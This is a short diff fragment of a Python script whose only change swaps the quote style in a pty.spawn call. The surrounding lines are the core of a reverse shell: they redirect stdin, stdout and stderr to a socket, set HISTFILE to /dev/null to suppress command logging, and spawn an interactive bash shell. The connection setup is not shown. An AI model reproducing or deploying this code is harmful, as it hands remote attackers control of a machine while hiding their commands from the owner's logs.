@@ -12,7 +12,7 @@ def main():
     os.dup2(s.fileno(),1)
     os.dup2(s.fileno(),2)
     os.putenv("HISTFILE",'/dev/null')
-    pty.spawn("/bin/bash")
+    pty.spawn('/bin/bash')
     s.close()
 
 if __name__ == "__main__":
